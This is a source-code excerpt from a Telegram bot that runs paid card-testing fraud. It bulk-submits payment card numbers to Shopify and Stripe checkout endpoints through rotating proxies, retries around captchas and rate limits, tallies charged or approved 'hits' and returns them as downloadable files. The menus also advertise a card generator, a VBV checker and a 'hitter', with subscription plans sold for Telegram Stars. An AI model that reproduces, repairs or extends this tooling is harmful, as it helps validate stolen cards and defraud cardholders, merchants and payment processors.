        try: await msg.answer(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=[btns]))
        except: pass

CONCURRENCY_BY_PLAN = {"free": 2, "pro": 4, "premium": 5, "max": 6, "unlimited": 8}
CONCURRENCY_BY_PLAN_LB = {"free": 5, "pro": 10, "premium": 25, "max": 40, "unlimited": 60}
RETRYABLE_CLS = {"error", "site_error", "proxy_error", "captcha", "rate_limited", "timeout"}

async def run_mass_check(msg, cards, bot, bypass_quota=False, uid=None, username=None, mode="shopify"):
    if uid is None: uid = msg.from_user.id
    if username is None: username = msg.from_user.username or ""
    user = get_user_or_create(uid, username)
    if not user or user["banned"]: return await msg.answer(f"{pe('cross1')} <b>{sc('Not allowed')}</b>", parse_mode="HTML")
    if mode == "shopify" and not load_handling_on() and (not _filtered_endpoints() or (endpoints_need_sites() and not get_sites())): return await msg.answer(f"{pe('warn')} <b>{sc('No API/Sites')}</b>", parse_mode="HTML")
    if not is_admin(uid) and not user_proxy_list(uid): return await msg.answer(f"{pe('cross1')} <b>{sc('Access Denied')}</b>", parse_mode="HTML")
    normalized, seen = [], set()
    for c in cards:
        n = normalize_cc(c.strip())
        if n and n not in seen: seen.add(n); normalized.append(n)
    if not normalized: return await msg.answer(f"{pe('warn')} <b>{sc('No valid cards')}</b>", parse_mode="HTML")
    if not bypass_quota:
        refreshed, plan_key = get_user(uid), plan_of(uid)
        if is_admin(uid): use_cards = normalized
        else:
            batch_limit = PLANS[plan_key]["mass_limit"]
            if len(normalized) > batch_limit: return await msg.answer(f"{pe('stop')} <b>{sc('Batch Limit Exceeded')}</b>", parse_mode="HTML")
            if plan_key in ("premium", "max", "unlimited"): use_cards = normalized; [consume_quota(uid) for _ in use_cards]
            else:
                affordable = max(0, PLANS[plan_key]["limit"] - refreshed["daily_checks"]) + (refreshed["credits"] // 2)
                if affordable <= 0: return await msg.answer(f"{pe('unlock')} <b>{sc('No quota')}</b>", parse_mode="HTML")
                use_cards = normalized[:min(len(normalized), affordable)]
                if len(use_cards) < len(normalized): await msg.answer(f"{pe('warn')} <b>{sc('Limited to')} {len(use_cards)}/{len(normalized)}</b>", parse_mode="HTML")
                [consume_quota(uid) for _ in use_cards]
    else: use_cards = normalized
    total = len(use_cards); _dead_proxies_run.clear(); _proxy_fail_streak.clear()
    source_proxies = user_proxy_list(uid); live_proxies = []
    if source_proxies:
        preflight_msg = await msg.answer(f"{pe('refresh')} <b>{sc('Preflight')}</b>...", parse_mode="HTML")
        pf = await preflight_proxies(uid, source_proxies); live_proxies = pf["live"]
        try: await preflight_msg.edit_text(f"{pe('check')} <b>{sc('Preflight Complete')}</b>\n<blockquote>{pe('online')} {sc('Live')}: <b>{len(pf['live'])}</b></blockquote>", parse_mode="HTML")
        except: pass
        if not is_admin(uid) and not live_proxies: return await msg.answer(f"{pe('cross1')} <b>{sc('No Live Proxies')}</b>", parse_mode="HTML")
        await asyncio.sleep(0.3 if load_handling_on() else 1.0)
        try: await preflight_msg.delete()
        except: pass
    task_id, cancel_ev = uuid.uuid4().hex[:8], asyncio.Event()
    _mass_tasks[task_id] = cancel_ev
    results, counts = {}, {"charged": 0, "approved": 0, "approved_nsf": 0, "approved_ccn": 0, "approved_3ds": 0, "captcha": 0, "declined": 0, "site_error": 0, "proxy_error": 0, "error": 0, "timeout": 0, "rate_limited": 0, "retried": 0, "retry_hit": 0}
    start_time, completed, hits_count, dropped_proxies, local_retry = time.time(), 0, 0, [], {}
    lb_on = load_handling_on()
    bot_conc = (MASS_CONCURRENCY_LB_ADMIN if (bypass_quota or is_admin(uid)) else MASS_CONCURRENCY_LB_PREMIUM if plan_of(uid) in ("premium", "max", "unlimited") else CONCURRENCY_BY_PLAN_LB.get(plan_of(uid), 5)) if lb_on else (8 if is_admin(uid) else 5 if plan_of(uid) in ("premium", "max", "unlimited") else CONCURRENCY_BY_PLAN.get(plan_of(uid), 2))
    batch_size, batch_delay = (MASS_BATCH_SIZE_LB, MASS_BATCH_DELAY_LB) if lb_on else (100, 5.0)
    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Cancel"), icon="stop", color="danger", callback_data=f"mc:cancel:{task_id}")]])
    def render(batch_num, batch_total, batch_done, batch_size_, phase="active"):
        pct, bar, fancy, elapsed = (int(100 * completed / total) if total else 0), make_bar(int(100 * completed / total) if total else 0, width=14), make_fancy_bar(int(100 * completed / total) if total else 0), time.time() - start_time
        speed, eta = (completed / elapsed if elapsed > 0 else 0), ((total - completed) / (completed / elapsed) if elapsed > 0 and completed > 0 else 0)
        _timeout_ct = counts.get("timeout", 0); _errs_ct = counts["error"] + counts["site_error"] + counts["proxy_error"]
        lines = [f"{pe('loading') if phase == 'active' else pe('refresh')} <b>{sc('Mass Checking') if phase == 'active' else sc('Retry Queue')}</b> · {completed}/{total} · <b>{pct}%</b>", f"<code>{bar}</code>", f"{fancy}", f"{pe('shop')} {sc('Batch')} <b>{batch_num}</b>/{batch_total} · {batch_done}/{batch_size_}", f"<blockquote>{pe('check')} {sc('Hits')}: <b>{hits_count}</b> · {pe('cross2')} {sc('Declined')}: <b>{counts['declined']}</b> · {pe('hourglass')} {sc('Timeouts')}: <b>{_timeout_ct}</b> · {pe('warn')} {sc('Errors')}: <b>{_errs_ct}</b></blockquote>", f"<blockquote>{pe('refresh')} {sc('Retry Q')}: <b>{len(local_retry)}</b> · {pe('check')} {sc('Retry Hits')}: <b>{counts['retry_hit']}</b> · {pe('link')} {sc('Proxies')}: <b>{max(0, len(live_proxies)-len(dropped_proxies))}</b> · {pe('online')} {sc('LB')}: <b>{'ON' if lb_on else 'OFF'}</b></blockquote>", f"{pe('hourglass')} {sc('ETA')}: <b>{_fmt_eta(eta)}</b> · {pe('percent')} <b>{speed:.1f} cc/s</b>", "<blockquote>"]
        for cc_k, (st, rsp) in list(results.items())[-5:]:
            icon = pe('check') if st in ('CHARGED','APPROVED_NSF','APPROVED','APPROVED_CCN','APPROVED_3DS') else (pe('cross2') if st == 'DECLINED' else pe('warn'))
            lines.append(f"{icon} <code>…{cc_k.split('|')[0][-4:]}</code> · {esc(_sanitize_err(rsp)[:28])}")
        return "\n".join(lines + ["</blockquote>"])
    async def do_check(cc, proxy, use_backup=False):
        try: return await call_api(cc, proxy=proxy, uid=uid, use_backup=use_backup, mode=mode, single=False)
        except Exception as e: return {"cls": "error", "response": _sanitize_err(str(e)), "_site": "", "_proxy": proxy, "_dropped": False, "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    async def handle_result(cc, res, is_retry=False):
        nonlocal completed, hits_count
        cls, site_, prx_, resp_, gw_, ts_ = res.get("cls", "error"), res.get("_site", ""), res.get("_proxy"), _sanitize_err(res.get("response", "")), res.get("gateway", "Shopify"), datetime.now(timezone.utc).isoformat()
        if res.get("_dropped") and prx_ and prx_ not in dropped_proxies: dropped_proxies.append(prx_)
        if cls in RETRYABLE_CLS:
            if cls == "site_error" and site_: _bench_site(site_, 180)
            if not is_retry:
                local_retry[cc] = {"retries": 0, "ready_at": time.time() + (LB_RETRY_COOLDOWN if not lb_on else 30), "last_prx": prx_}
                results[cc] = ("RETRY", resp_[:35])
            else:
                results[cc] = ("TIMEOUT" if cls == "timeout" else "ERROR", resp_[:35])
                if cls == "timeout": counts["timeout"] += 1
                else: counts["error"] += 1
                completed += 1
            return
        if is_hit(cls):
            results[cc], counts[cls] = (cls.upper(), resp_[:35]), counts.get(cls, 0) + 1
            hits_count += 1
            if is_retry: counts["retry_hit"] += 1
            asyncio.create_task(send_chat_hit(bot, msg.chat.id, cc, res, site_))
            try:
                async with _get_write_lock():
                    with db() as c: c.execute("INSERT INTO check_logs(uid,cc,response,status,gateway,ts) VALUES(?,?,?,?,?,?)", (uid, cc, resp_, "HIT", gw_, ts_)); c.execute("UPDATE users SET total_hits=total_hits+1 WHERE uid=?", (uid,))
            except: pass
            try: await record_charged(cc, res, site_, uid)
            except Exception as e: log.error(f"mass_check record_charged: {e}")
        else:
            results[cc], counts["declined"] = ("DECLINED", resp_[:35]), counts["declined"] + 1
            try:
                async with _get_write_lock():
                    with db() as c: c.execute("INSERT INTO check_logs(uid,cc,response,status,gateway,ts) VALUES(?,?,?,?,?,?)", (uid, cc, resp_, "DECLINED", gw_, ts_))
            except: pass
        completed += 1
    batches, total_batches = [use_cards[i:i + batch_size] for i in range(0, total, batch_size)], max(1, (total + batch_size - 1) // batch_size)
    progress = await msg.answer(render(1, total_batches, 0, len(batches[0]) if batches else 0), parse_mode="HTML", reply_markup=cancel_kb)
    for b_idx, batch in enumerate(batches, start=1):
        if cancel_ev.is_set() or (not is_admin(uid) and not [p for p in live_proxies if p not in dropped_proxies] and live_proxies): break
        bot_sem, batch_done = asyncio.Semaphore(bot_conc), 0
        async def active_one(cc):
            nonlocal batch_done
            if cancel_ev.is_set(): return
            async with bot_sem:
                if cancel_ev.is_set(): return
                live_now = [p for p in live_proxies if p not in dropped_proxies]
                if not live_now and not is_admin(uid) and live_proxies: results[cc] = ("ERROR", "no live proxies"); counts["error"] += 1; batch_done += 1; return
                await handle_result(cc, await do_check(cc, rotate_proxy(uid, live_now) if live_now else None, use_backup=False), is_retry=False)
                batch_done += 1
        tasks, last_edit = [asyncio.create_task(active_one(c)) for c in batch], 0.0
        for fut in asyncio.as_completed(tasks):
            try: await fut
            except: pass
            if cancel_ev.is_set():
                for t in tasks:
                    if not t.done(): t.cancel()
                break
            if time.time() - last_edit >= 1.5 or batch_done == len(batch):
                last_edit = time.time()
                try: await progress.edit_text(render(b_idx, total_batches, batch_done, len(batch), "active"), parse_mode="HTML", reply_markup=cancel_kb)
                except: pass
        if cancel_ev.is_set(): break
        if b_idx < total_batches and not cancel_ev.is_set():
            try: await progress.edit_text(render(b_idx, total_batches, len(batch), len(batch), "active") + f"\n{pe('hourglass')} {sc('Next batch in')} {int(batch_delay)}s...", parse_mode="HTML", reply_markup=cancel_kb)
            except: pass
            try: await asyncio.wait_for(cancel_ev.wait(), timeout=batch_delay)
            except asyncio.TimeoutError: pass
    if local_retry and not cancel_ev.is_set():
        try: await progress.edit_text(f"{pe('refresh')} <b>{sc('Retry Phase')}</b>\n<blockquote>{pe('hourglass')} {sc('Cooling down')} {LB_RETRY_COOLDOWN}s ({len(local_retry)} {sc('cards')})...</blockquote>", parse_mode="HTML", reply_markup=cancel_kb)
        except: pass
        max_wait = max((v["ready_at"] - time.time()) for v in local_retry.values())
        if max_wait > 0 and not cancel_ev.is_set():
            try: await asyncio.wait_for(cancel_ev.wait(), timeout=max_wait)
            except asyncio.TimeoutError: pass
        for retry_round in range(1, LB_MAX_RETRIES + 1):
            if cancel_ev.is_set(): break
            ready_now = {cc: v for cc, v in local_retry.items() if time.time() >= v["ready_at"] and v["retries"] < LB_MAX_RETRIES}
            if not ready_now: break
            try: await progress.edit_text(f"{pe('refresh')} <b>{sc('Retry')} {retry_round}/{LB_MAX_RETRIES}</b>\n<blockquote>{pe('shop')} {sc('Cards')}: <b>{len(ready_now)}</b></blockquote>", parse_mode="HTML", reply_markup=cancel_kb)
            except: pass
            retry_sem, retry_done = asyncio.Semaphore(bot_conc), 0
            async def retry_one(cc):
                nonlocal retry_done
                if cancel_ev.is_set(): return
                async with retry_sem:
                    if cancel_ev.is_set(): return
                    live_now = [p for p in live_proxies if p not in dropped_proxies]; old_prx = local_retry.get(cc, {}).get("last_prx"); fresh = [p for p in live_now if p != old_prx] or live_now
                    proxy = rotate_proxy(uid, fresh) if fresh else None
                    res = await do_check(cc, proxy, use_backup=True); info = local_retry.get(cc, {"retries": 0}); info["retries"] += 1; info["last_prx"] = proxy; info["ready_at"] = time.time() + LB_RETRY_COOLDOWN; local_retry[cc] = info; counts["retried"] += 1
                    await handle_result(cc, res, is_retry=True)
                    if results.get(cc, ("",))[0] not in ("RETRY", "ERROR") or info["retries"] >= LB_MAX_RETRIES: local_retry.pop(cc, None)
                    retry_done += 1
            r_tasks, last_edit2 = [asyncio.create_task(retry_one(c)) for c in ready_now], 0.0
            for fut in asyncio.as_completed(r_tasks):
                try: await fut
                except: pass
                if cancel_ev.is_set():
                    for t in r_tasks:
                        if not t.done(): t.cancel()
                    break
                if time.time() - last_edit2 >= 2.0 or retry_done == len(ready_now):
                    last_edit2 = time.time()
                    try: await progress.edit_text(render(total_batches, total_batches, retry_done, len(ready_now), "retry"), parse_mode="HTML", reply_markup=cancel_kb)
                    except: pass
            if local_retry and retry_round < LB_MAX_RETRIES and not cancel_ev.is_set():
                try: await asyncio.wait_for(cancel_ev.wait(), timeout=LB_RETRY_COOLDOWN)
                except asyncio.TimeoutError: pass
    _mass_tasks.pop(task_id, None)
    elapsed = time.time() - start_time
    timeout_count = counts.get("timeout", 0); real_errors = counts["error"] + counts["site_error"] + counts["proxy_error"]
    final = (f"{pe('stop')} <b>{sc('Cancelled')}</b>\n<blockquote>{pe('shop')} {sc('Done')}: <b>{completed}/{total}</b>\n{pe('check')} {sc('Hits')}: <b>{hits_count}</b></blockquote>") if cancel_ev.is_set() else f"{pe('check')} <b>{sc('Mass Complete')}</b>\n<blockquote>{pe('shop')} {sc('Total')}: <b>{total}</b>\n{pe('check')} {sc('Hits')}: <b>{hits_count}</b>\n{pe('online')} {sc('3DS')}: <b>{counts['approved_3ds']}</b>\n{pe('warn')} {sc('Captcha')}: <b>{counts['captcha']}</b>\n{pe('cross2')} {sc('Declined')}: <b>{counts['declined']}</b>\n{pe('hourglass')} {sc('Timeouts')}: <b>{timeout_count}</b>\n{pe('warn')} {sc('Errors')}: <b>{real_errors}</b>\n{pe('refresh')} {sc('Retried')}: <b>{counts['retried']}</b> · {pe('check')} {sc('Retry Hits')}: <b>{counts['retry_hit']}</b>\n{pe('link')} {sc('Proxies dropped')}: <b>{len(dropped_proxies)}</b>\n{pe('hourglass')} {sc('Time')}: <b>{elapsed:.1f}s</b></blockquote>"
    try: await progress.edit_text(final, parse_mode="HTML", reply_markup=None)
    except: pass
    for name, fname, lst in [("Charged", "charged.txt", [(cc, rsp) for cc, (st, rsp) in results.items() if st == "CHARGED"]), ("NSF", "nsf.txt", [(cc, rsp) for cc, (st, rsp) in results.items() if st == "APPROVED_NSF"]), ("All Hits", "hits.txt", [(cc, rsp) for cc, (st, rsp) in results.items() if st in ("CHARGED","APPROVED","APPROVED_NSF","APPROVED_CCN","APPROVED_3DS")])]:
        if lst and not (name == "All Hits" and len(lst) == len([(cc, rsp) for cc, (st, rsp) in results.items() if st == "CHARGED"])):
            try: await msg.answer_document(BufferedInputFile("\n".join(f"{cc} | {rsp}" for cc, rsp in lst).encode(), filename=fname), caption=f"{pe('check')} <b>{name} ({len(lst)})</b>", parse_mode="HTML")
            except: pass

# ── Menu callbacks ───────────────────────────────────────────────────────────
@router.callback_query(F.data == "menu:main")
async def cb_main(cb: CallbackQuery):
    set_awaiting(cb.from_user.id, '')
    user = get_user_or_create(cb.from_user.id, cb.from_user.username or "")
    if not user: return await cb.answer("Try /start", show_alert=True)
    await safe_edit_media(cb, IMG_MAIN, welcome_text(user, cb.from_user.first_name), main_menu_kb(cb.from_user.id))
    await cb.answer()

@router.callback_query(F.data == "menu:close")
async def cb_close(cb: CallbackQuery):
    try: await cb.message.delete()
    except: pass
    await cb.answer()

@router.callback_query(F.data == "menu:redeem")
async def cb_redeem_menu(cb: CallbackQuery):
    set_awaiting(cb.from_user.id, "redeem_input")
    try: await cb.message.edit_text(f"{pe('gem2')} <b>{sc('Redeem Code')}</b>\n<blockquote>{pe('pen')} {sc('Send your code below')}\n{pe('docs')} {sc('Format')}: <code>{KEY_BRAND_PREFIX}-XXXX-XXXX</code></blockquote>", parse_mode="HTML", reply_markup=back_kb())
    except: pass
    await cb.answer()

@router.callback_query(F.data == "menu:proxy")
async def cb_proxy(cb: CallbackQuery):
    proxies = user_proxy_all(cb.from_user.id)
    live = sum(1 for p in proxies if p["status"] == "live")
    try: await cb.answer()
    except: pass
    text = (
        f"{hdr('PROXY MANAGER', 'link')}\n"
        f"<blockquote>"
        f"{pe('online')}  {sc('Live')} · <b>{live}</b>\n"
        f"{pe('warn')}  {sc('Total')} · <b>{len(proxies)}</b>\n"
        f"{pe('shield')}  {sc('Max live')} · <b>{LIVE_PROXY_LIMIT}</b>"
        f"</blockquote>\n"
        f"<blockquote>"
        f"{pe('pen')} <b>Formats</b>\n"
        f"<code>user:pass@host:port</code>\n"
        f"<code>host:port:user:pass</code>"
        f"</blockquote>"
    )
    await safe_edit_media(cb, IMG_PROXY, text, proxy_kb(cb.from_user.id))

@router.callback_query(F.data == "proxy:add")
async def cb_proxy_add(cb: CallbackQuery):
    set_awaiting(cb.from_user.id, "add_proxy")
    try: await cb.message.edit_text(f"{pe('add')} <b>{sc('Add Proxies')}</b>\n<blockquote>{pe('pen')} <code>user:pass@host:port</code>\n{pe('docs')} or reply to a .txt file</blockquote>", parse_mode="HTML", reply_markup=back_kb())
    except: pass
    await cb.answer()

@router.callback_query(F.data == "proxy:check")
async def cb_proxy_check(cb: CallbackQuery):
    try: await cb.answer("Testing...")
    except: pass
    try: await cb.message.delete()
    except: pass
    st = await cb.message.answer(f"{pe('loading')} <b>{sc('Testing proxies')}...</b>", parse_mode="HTML")
    rows = user_proxy_all(cb.from_user.id)
    if not rows: return await st.edit_text(f"{pe('warn')} <b>{sc('No proxies')}</b>", parse_mode="HTML", reply_markup=proxy_kb(cb.from_user.id))
    alive, dead, sem, now, lock = 0, 0, asyncio.Semaphore(PROXY_TEST_BATCH), datetime.now(timezone.utc).isoformat(), asyncio.Lock()
    async def t(p):
        nonlocal alive, dead
        async with sem:
            r = await check_proxy_hq(p)
            async with lock:
                if r.get("ok"):
                    with db() as c: c.execute("UPDATE user_proxies SET status='live', latency=?, checked_at=? WHERE uid=? AND proxy=?", (r.get("latency",0), now, cb.from_user.id, p))
                    alive += 1
                else:
                    with db() as c: c.execute("DELETE FROM user_proxies WHERE uid=? AND proxy=?", (cb.from_user.id, p))
                    dead += 1
    await asyncio.gather(*(t(r["proxy"]) for r in rows))
    await st.edit_text(f"{pe('check')} <b>{sc('Revalidated')}</b>\n<blockquote>{pe('online')} {sc('Live')}: <b>{alive}</b>\n{pe('warn')} {sc('Removed')}: <b>{dead}</b></blockquote>", parse_mode="HTML", reply_markup=proxy_kb(cb.from_user.id))

@router.callback_query(F.data == "proxy:list")
async def cb_proxy_list(cb: CallbackQuery):
    try: await cb.answer()
    except: pass
    rows = user_proxy_all(cb.from_user.id)
    if not rows:
        return await cb.message.answer(f"{pe('warn')} <b>{sc('No proxies')}</b>", parse_mode="HTML", reply_markup=proxy_kb(cb.from_user.id))
    lines = [f"{pe('docs')} <b>{sc('Your Proxies')} ({len(rows)})</b>\n<blockquote>"]
    for r in rows[:30]:
        if r["status"] == "live": icon = pe("check")
        elif r["status"] == "dead": icon = pe("cross2")
        else: icon = pe("warn")
        latency = f"{r['latency']:.2f}s" if r["latency"] else "—"
        lines.append(f"{icon} <code>{esc(proxy_display(r['proxy'])[:50])}</code> · {latency}")
    lines.append("</blockquote>")
    try: await cb.message.delete()
    except: pass
    try: await cb.message.answer("\n".join(lines), parse_mode="HTML", reply_markup=proxy_kb(cb.from_user.id))
    except: pass

@router.callback_query(F.data == "proxy:clear")
async def cb_proxy_clear(cb: CallbackQuery):
    try: await cb.answer("Cleared", show_alert=True)
    except: pass
    clear_user_proxies(cb.from_user.id)
    try: await cb_proxy(cb)
    except: pass

@router.callback_query(F.data == "menu:tools")
async def cb_tools(cb: CallbackQuery):
    await safe_edit_media(cb, IMG_TOOLS, f"{pe('tools')} <b>{sc('Tools')}</b>", tools_kb())
    await cb.answer()

@router.callback_query(F.data.startswith("gen:"))
async def cb_gen(cb: CallbackQuery):
    try: await safe_edit_media(cb, IMG_TOOLS, f"{pe('check')} <b>10 {sc('Cards')}</b>\n<blockquote><code>{chr(10).join(generate_cc(cb.data.split(':')[1], 10))}</code></blockquote>", back_kb()); await cb.answer()
    except Exception as e: await cb.answer(f"Error: {e}", show_alert=True)

@router.callback_query(F.data == "menu:account")
async def cb_account(cb: CallbackQuery):
    user = get_user_or_create(cb.from_user.id, cb.from_user.username or "")
    if not user: return await cb.answer("Try /start", show_alert=True)
    pk, unlimited = (user["plan"] if user["plan"] in PLANS else "free"), (is_admin(cb.from_user.id) or user["plan"] in ("premium", "max", "unlimited"))
    await safe_edit_media(cb, IMG_ACCOUNT, f"{pe('user')} <b>{sc('Account')}</b>\n<blockquote>{pe('gem')} {sc('Plan')}: <b>{PLANS[pk]['name']}</b>\n{pe('hourglass')} {sc('Expires')}: {'Never' if pk == 'unlimited' or not user['premium_until'] else user['premium_until'][:10]}\n{pe('chart')} {sc('Checks')}: <b>{user['daily_checks']}/{('∞' if unlimited else PLANS[pk]['limit'])}</b>\n{pe('shop')} {sc('Per Check')}: <b>{('∞' if is_admin(cb.from_user.id) else PLANS[pk]['mass_limit'])}</b> cards\n{pe('star')} {sc('Credits')}: <b>{('∞' if unlimited else user['credits'])}</b></blockquote>", back_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:stats")
async def cb_stats(cb: CallbackQuery):
    with db() as c:
        tu, tc, th, pr = c.execute("SELECT COUNT(*) as n FROM users").fetchone()["n"], c.execute("SELECT COUNT(*) as n FROM check_logs").fetchone()["n"], c.execute("SELECT COUNT(*) as n FROM check_logs WHERE status='HIT'").fetchone()["n"], c.execute("SELECT COUNT(*) as n FROM users WHERE plan != 'free'").fetchone()["n"]
    await safe_edit_media(cb, IMG_ACCOUNT, f"{pe('chart')} <b>{sc('Global Stats')}</b>\n<blockquote>{pe('user')} {sc('Users')} · <b>{tu:,}</b>\n{pe('gem')} {sc('Premium')} · <b>{pr:,}</b>\n{pe('shop')} {sc('Checks')} · <b>{tc:,}</b>\n{pe('check')} {sc('Hits')} · <b>{th:,}</b>\n{pe('percent')} {sc('Rate')} · <b>{(th / tc * 100 if tc else 0):.1f}%</b></blockquote>", back_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:shop")
async def cb_shop(cb: CallbackQuery):
    try: await cb.answer()
    except: pass
    text = (
        f"{hdr('PREMIUM PLANS', 'star')}\n"
        f"<blockquote>"
        f"{pe('gem')}   <b>Premium</b>   ·  5,000 / check\n"
        f"{pe('gem2')}  <b>MAX</b>       ·  10,000 / check\n"
        f"{pe('infinity')} <b>Unlimited</b> ·  20,000 / check"
        f"</blockquote>\n"
        f"<blockquote>"
        f"{pe('star')}  {sc('Payment')} · <b>Telegram Stars</b>\n"
        f"{pe('clock')}  {sc('Duration')} · <b>30 Days</b>"
        f"</blockquote>"
    )
    await safe_edit_media(cb, IMG_SHOP, text, shop_kb())

@router.callback_query(F.data == "menu:trial")
async def cb_trial(cb: CallbackQuery):
    user = get_user_or_create(cb.from_user.id, cb.from_user.username or "")
    if not user: return await cb.answer("Try /start", show_alert=True)
    if user["banned"]: return await cb.answer("Banned", show_alert=True)
    now = datetime.now(timezone.utc)
    if user["trial_last_used"]:
        try:
            last = datetime.fromisoformat(user["trial_last_used"])
            if (now - last).days < 7: return await cb.answer(f"Wait {7-(now-last).days}d", show_alert=True)
        except: pass
    with db() as c: c.execute("UPDATE users SET plan='pro', premium_until=?, trial_last_used=? WHERE uid=?", ((now + timedelta(days=1)).isoformat(), now.isoformat(), cb.from_user.id))
    await cb.answer("Pro Trial · 1 Day", show_alert=True)
    await cb_main(cb)

@router.callback_query(F.data == "menu:check")
async def cb_check_menu(cb: CallbackQuery):
    lb_parts = (["VPS"] if load_handling_vps_on() else []) + (["HRK"] if load_handling_heroku_on() else [])
    lb_line = f" · {sc('LB')}: {' + '.join(lb_parts)}" if lb_parts else ""
    text = (
        f"{hdr('CHECKER', 'shop')}{lb_line}\n"
        f"<blockquote>"
        f"{pe('card')}  <b>Shopify · Single</b>\n"
        f"<code>/sh CC|MM|YY|CVV</code>\n\n"
        f"{pe('gem')}   <b>Shopify · Mass</b>\n"
        f"<code>/msh</code>"
        f"</blockquote>\n"
        f"<blockquote>"
        f"{pe('docs')}  <b>Stripe Auth · Single</b>\n"
        f"<code>/auth CC|MM|YY|CVV</code>\n\n"
        f"{pe('gem2')}  <b>Stripe Auth · Mass</b>\n"
        f"<code>/mauth</code>"
        f"</blockquote>\n"
        f"{pe('warn')} <b>{sc('Proxy required for every check')}</b>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Add Proxy"), icon="add", color="success", callback_data="proxy:add")], [pbtn(sc("Back"), icon="back", callback_data="menu:main")]])
    await safe_edit_media(cb, IMG_CHECK, text, kb)
    await cb.answer()

@router.callback_query(F.data == "menu:hitters")
async def cb_hitters_menu(cb: CallbackQuery):
    text = (
        f"{hdr('HITTERS', 'fire_e')}\n"
        f"<blockquote>"
        f"{pe('thunder_e')} <b>Jio Single</b> · <code>/jhit NUM AMT CC</code>\n"
        f"{pe('shield')} <b>VBV Checker</b> · <code>/vbv CC|MM|YY|CVV</code>"
        f"</blockquote>\n"
        f"<blockquote><i>{sc('Premium users only')}</i></blockquote>"
    )
    await safe_edit_media(cb, IMG_HITTER, text, hitters_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:pay")
async def cb_pay_menu(cb: CallbackQuery):
    await safe_edit_media(cb, IMG_PAY, _pay_wallets_text(), pay_kb())
    await cb.answer()

@router.callback_query(F.data == "menu:support")
async def cb_support_menu(cb: CallbackQuery):
    text = (
        f"{hdr('SUPPORT', 'chat')}\n"
        f"<blockquote>"
        f"{pe('pen')} <b>Send issue / request</b>:\n"
        f"<code>/mdev your message</code>\n\n"
        f"{pe('docs')} <b>Or reply to any message / image / doc with</b> <code>/mdev</code>"
        f"</blockquote>"
    )
    await safe_edit_media(cb, IMG_MAIN, text, back_kb())
    await cb.answer()

@router.callback_query(F.data == "pay:proof_help")
async def cb_pay_proof_help(cb: CallbackQuery):
    await cb.answer()
    await cb.message.answer(
        f"{pe('docs')} <b>{sc('How to submit proof')}</b>\n"
        f"<blockquote>"
        f"1. Send the payment screenshot to this chat\n"
        f"2. Reply to it with <code>/proof</code>\n"
        f"3. Admin receives notification\n"
        f"4. Wait for approval + key"
        f"</blockquote>",
        parse_mode="HTML")

@router.callback_query(F.data.startswith("proof_app:"))
async def cb_proof_app(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return await cb.answer("No", show_alert=True)
    try: target_uid = int(cb.data.split(":")[1])
    except: return await cb.answer("Bad id", show_alert=True)
    set_awaiting(cb.from_user.id, f"proof_days:{target_uid}")
    await cb.message.edit_reply_markup(reply_markup=None)
    await cb.message.answer(
        f"{pe('gem')} <b>{sc('Approve proof')}</b> for UID <code>{target_uid}</code>\n"
        f"<blockquote>{sc('Enter duration in days (e.g. 30)')}</blockquote>",
        parse_mode="HTML")
    await cb.answer()

@router.callback_query(F.data.startswith("proof_rej:"))
async def cb_proof_rej(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return await cb.answer("No", show_alert=True)
    try: target_uid = int(cb.data.split(":")[1])
    except: target_uid = 0
    await cb.message.edit_reply_markup(reply_markup=None)
    if target_uid:
        try:
            await cb.bot.send_message(target_uid,
                f"{pe('cross1')} <b>{sc('Payment Rejected')}</b>\n"
                f"<blockquote>Contact support via <code>/mdev</code>.</blockquote>",
                parse_mode="HTML")
        except: pass
    await cb.answer("Rejected")

@router.callback_query(F.data.startswith("buy:"))
async def cb_buy(cb: CallbackQuery):
    prod_key = cb.data.split(":", 1)[1]
    prod = get_star_products().get(prod_key)
    if not prod: return await cb.answer("Invalid", show_alert=True)
    try:
        await cb.bot.send_invoice(chat_id=cb.from_user.id, title=f"{BOT_BRAND} · {prod['label']}", description=f"{prod['plan'].title()} for {prod['days']}d", payload=f"plan:{prod['plan']}:{prod['days']}", provider_token="", currency="XTR", prices=[LabeledPrice(label=prod["label"], amount=prod["stars"])])
    except Exception as e: return await cb.answer(f"Error: {e}", show_alert=True)
    await cb.answer()

@router.pre_checkout_query()
async def pre_checkout(q: PreCheckoutQuery):
    try: await q.answer(ok=True)
    except: pass

@router.message(F.successful_payment)
async def on_paid(msg: Message):
    sp = msg.successful_payment
    if not sp: return
    ensure_user(msg.from_user.id, msg.from_user.username or "")
    parts = (sp.invoice_payload or "").split(":")
    if len(parts) == 3 and parts[0] == "plan":
        try: days = int(parts[2])
        except: days = 30
        upgrade_user(msg.from_user.id, parts[1], days)
        try: await msg.answer(f"{pe('check')} <b>{sc('Paid')}</b>\n<blockquote>{pe('gem')} <b>{PLANS[parts[1]]['name']}</b> · {days}d</blockquote>", parse_mode="HTML")
        except: pass

@router.callback_query(F.data.startswith("recheck:"))
async def cb_recheck(cb: CallbackQuery):
    cc = cb.data.split(":", 1)[1]
    try: await cb.answer("Rechecking...")
    except: pass
    if CC_REGEX.match(cc): await process_check_logic(cb.message, cc, cb.bot, uid=cb.from_user.id, username=cb.from_user.username or "")

@router.callback_query(F.data.startswith("save:"))
async def cb_save(cb: CallbackQuery):
    with db() as c: c.execute("INSERT OR IGNORE INTO saved_cards(uid, cc, saved_at) VALUES (?,?,?)", (cb.from_user.id, cb.data.split(":", 1)[1], datetime.now(timezone.utc).isoformat()))
    await cb.answer("Saved")

@router.callback_query(F.data.startswith("mc:cancel:"))
async def cb_mc_cancel(cb: CallbackQuery):
    ev = _mass_tasks.get(cb.data.split(":", 2)[2])
    if ev: ev.set(); await cb.answer("Cancelling...")
    else: await cb.answer("Done")

@router.callback_query(F.data.startswith("fb_app:"))
async def cb_fb_app(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Not allowed", show_alert=True)
    try: fid = int(cb.data.split(":")[1])
    except: return await cb.answer("Bad id", show_alert=True)
    with db() as c: r = c.execute("SELECT * FROM feedback WHERE id=?", (fid,)).fetchone()
    if not r: return await cb.answer("Not found", show_alert=True)
